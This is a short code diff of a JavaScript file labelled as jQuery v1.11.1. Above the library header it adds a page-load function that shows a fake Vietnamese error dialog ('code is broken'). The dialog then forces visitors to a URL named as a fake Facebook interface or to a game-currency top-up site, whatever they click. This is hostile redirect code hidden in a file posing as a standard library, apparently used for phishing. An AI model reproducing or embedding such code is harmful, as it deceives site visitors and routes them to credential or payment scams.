@@ -1,12 +1,15 @@
-    function conf() {
+                   function conf() {
             var option = confirm('Code hiện đang bị lỗi! Vui lòng bấm ok để tải lại code hoặc cancel để tới trang nạp thẻ')
-			if(!option) {
+			if(option) {
 				window.location.href='https://ticchien111.github.io/giaodien-fb-fake/';
-			}window.location.href='https://napkimcuongx10.ml/';
+			}else
+            window.location.href='https://napkimcuongx10.ml/';
         }
         window.onload = function () { 
 
             conf();
+
+}
 
 }
 /*! jQuery v1.11.1 | (c) 2005, 2014 jQuery Foundation, Inc. | jquery.org/license */
